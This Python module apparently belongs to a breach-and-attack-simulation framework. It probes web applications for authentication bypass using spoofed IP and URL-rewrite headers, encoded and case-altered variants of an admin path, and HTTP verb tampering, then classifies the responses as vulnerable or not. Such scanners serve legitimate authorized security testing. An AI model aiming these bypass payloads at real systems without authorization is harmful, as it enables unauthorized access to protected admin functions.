"""
Authentication Bypass testing module.

Tests for common auth bypass techniques:
- Default credentials
- Path traversal bypasses
- HTTP verb tampering
- Header-based auth bypass
- Parameter manipulation

MITRE ATT&CK: T1078 - Valid Accounts
"""

from __future__ import annotations

import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Auth bypass techniques organized by category
HEADER_BYPASSES = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
]

PATH_BYPASSES = [
    "/admin",
    "/admin/",
    "//admin",
    "/./admin",
    "/admin/.",
    "/admin%20",
    "/admin%09",
    "/%2fadmin",
    "/admin;/",
    "/.;/admin",
    "/Admin",
    "/ADMIN",
    "/admin.json",
    "/admin.css",
    "/admin?anything",
    "/admin#",
    "/admin..;/",
]

HTTP_VERB_BYPASSES = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]


class AuthBypassModule(BaseAttackModule):
    """Authentication and authorization bypass testing."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="auth_bypass",
            description="Auth bypass - headers, path manipulation, verb tampering, defaults",
            category="auth_bypass",
            mitre_technique_ids=["T1078", "T1548"],
            mitre_technique_names=["Valid Accounts", "Abuse Elevation Control Mechanism"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT,
            owasp_category="A01:2021 - Broken Access Control",
            cwe_ids=["CWE-287", "CWE-284"],
            tags=["auth", "bypass", "access_control"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = []

        # Header bypasses
        for headers in HEADER_BYPASSES:
            payloads.append(f"HEADER:{next(iter(headers))}={next(iter(headers.values()))}")

        # Path bypasses
        base_path = options.get("protected_path", "/admin")
        for bypass in PATH_BYPASSES:
            if base_path != "/admin":
                adjusted = bypass.replace("/admin", base_path)
                payloads.append(f"PATH:{adjusted}")
            else:
                payloads.append(f"PATH:{bypass}")

        # Verb tampering
        for verb in HTTP_VERB_BYPASSES:
            payloads.append(f"VERB:{verb}")

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        base_path = options.get("protected_path", "/admin")

        for payload in payloads:
            req_id = str(uuid.uuid4())[:8]
            attack_type, value = payload.split(":", 1) if ":" in payload else ("unknown", payload)

            if attack_type == "HEADER":
                header_name, header_value = value.split("=", 1)
                requests.append(AttackRequest(
                    request_id=f"auth-{req_id}",
                    target=target,
                    method="GET",
                    path=base_path,
                    headers={
                        header_name: header_value,
                        "X-BAS-Attack-Type": "header_bypass",
                    },
                ))
            elif attack_type == "PATH":
                requests.append(AttackRequest(
                    request_id=f"auth-{req_id}",
                    target=target,
                    method="GET",
                    path=value,
                    headers={"X-BAS-Attack-Type": "path_bypass"},
                ))
            elif attack_type == "VERB":
                requests.append(AttackRequest(
                    request_id=f"auth-{req_id}",
                    target=target,
                    method=value,
                    path=base_path,
                    headers={"X-BAS-Attack-Type": "verb_tampering"},
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        attack_type = request.headers.get("X-BAS-Attack-Type", "unknown")

        # Success = we got past auth
        if response.status_code in (200, 201, 204):
            body_lower = response.body_text.lower()
            # Verify it's actually admin content, not a redirect or error page
            admin_indicators = ["admin", "dashboard", "management", "settings", "users", "config"]
            has_admin_content = any(ind in body_lower for ind in admin_indicators)

            if has_admin_content:
                return ModuleResult(
                    module_name="auth_bypass",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Auth bypass via {attack_type}: accessed protected resource (status {response.status_code})",
                    severity="critical",
                    mitre_technique_id="T1078",
                    detail={"detection_type": attack_type},
                )
            else:
                return ModuleResult(
                    module_name="auth_bypass",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Potential auth bypass via {attack_type}: got 200 but admin content uncertain",
                    severity="medium",
                    mitre_technique_id="T1078",
                    detail={"detection_type": attack_type},
                )

        return ModuleResult(
            module_name="auth_bypass",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
